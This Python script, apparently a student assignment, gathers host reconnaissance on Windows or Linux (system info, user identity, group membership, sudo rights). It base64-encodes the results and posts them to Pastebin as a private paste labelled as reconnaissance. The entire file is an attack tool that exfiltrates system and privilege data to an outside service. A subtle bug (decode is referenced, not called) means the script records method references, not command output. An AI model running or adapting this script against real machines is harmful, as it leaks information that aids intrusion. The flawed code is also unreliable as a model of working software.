# Wilson Nugrah
# 2301858976
# GSLC PasteBin

import sys
import base64
import platform
import requests
from subprocess import PIPE 
from subprocess import Popen


Pastebinurl = 'https://pastebin.com/api/api_post.php'
Pastebinkey = ''
data = ''

if platform.system() == 'Windows':
    process = Popen(args="systeminfo", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    hostname = f"Hostname Info: \n{result.decode}\n"
    data += hostname
    if error != b'':
        print (error.decode())

    process = Popen(args="whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    userinfo = f"User Info/Privilage: \n{result.decode}\n"
    data += userinfo
    if error != b'':
        print (error.decode())

elif platform.system() == 'Linux':
    process = Popen(args="hostnamectl", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    hostname = f"Hostname Info: \n{result.decode}\n"
    data += hostname
    if error != b'':
        print (error.decode())

    process = Popen(args="whoami", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    userinfo = f"User Info: \n{result.decode}\n"
    data += userinfo
    if error != b'':
        print (error.decode())

    process = Popen(args="id", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    userid = f"User ID: \n{result.decode}\n"
    data += userid
    if error != b'':
        print (error.decode())

    process = Popen(args="sudo -l", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate()
    privilage = f"User privilage: \n{result.decode}\n"
    data += privilage
    if error != b'':
        print (error.decode())
    
if data != '':
    Pastebindata = {
        'api_dev_key' : Pastebinkey,
        'api_option' : 'paste',
        'api_paste_private': '1',
        'api_paste_code': base64.b64encode(data.encode()),
        'api_paste_name': 'HOST_RECONNAISSANCE_PASTEBIN'
    }

    Pastebin = requests.post(url=Pastebinurl, data=Pastebindata)
    Pastebin_url = Pastebin.text
    print (f"PasteBin Link : {Pastebin_url}")
else:
    sys.exit('Program failed to run')